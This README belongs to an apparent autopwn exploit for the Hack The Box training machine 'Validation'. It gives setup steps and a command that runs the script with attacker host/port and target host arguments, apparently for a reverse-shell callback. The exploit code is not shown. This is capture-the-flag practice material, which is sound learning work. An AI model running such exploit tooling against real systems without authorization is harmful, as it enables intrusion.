# HTB Validation Autopwn

This is an attempt to write an autopwn for the HTB machine Validation. To reproduce this exploit successfully, you must be connected to the box through a vpn.

Steps to reproduce:

1. Install venv:

```
sudo apt install python3.11-venv
```

2. Initialize venv in the repository:

```
python3 -m venv ./env
source ./env/bin/activate
```

3. Install requirements.txt:

```
pip3 install -r requirements.txt
```

4. Run the exploit:

```
python3 validation_autopwn.py -l <LOCAL_HOST> -p <LOCAL_PORT> -r <REMOTE_TARGET_HOST>
```

- Alternatively:

```
python3 validation_autopwn.py --lhost <LOCAL_HOST> --lport <LOCAL_PORT> --rhost <REMOTE_TARGET_HOST>
```

- Example:

```
python3 validation_autopwn.py -l 10.10.16.80 -p 4444 -r 10.129.240.234
```

Thanks for reading, and happy hacking!
